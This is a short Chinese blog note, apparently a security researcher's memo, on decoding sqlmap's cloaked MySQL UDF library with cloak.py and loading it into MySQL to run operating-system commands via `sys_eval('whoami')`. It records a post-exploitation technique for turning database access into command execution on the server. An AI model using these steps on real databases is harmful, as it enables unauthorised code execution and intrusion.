---
title: "SQLmap udf dll 解码"
date: 2018-06-07T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['sqli','mysql']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


SQLmap udf dll 解码

<!--more-->

文件.

`udf/mysql/windows/32/lib_mysqludf_sys.dll_`

用 extra/cloak 下的 cloak.py 解码.

`cloak.py -d -i lib_mysqludf_sys.dll_`

mysql 导入执行.

`select sys_eval('whoami');`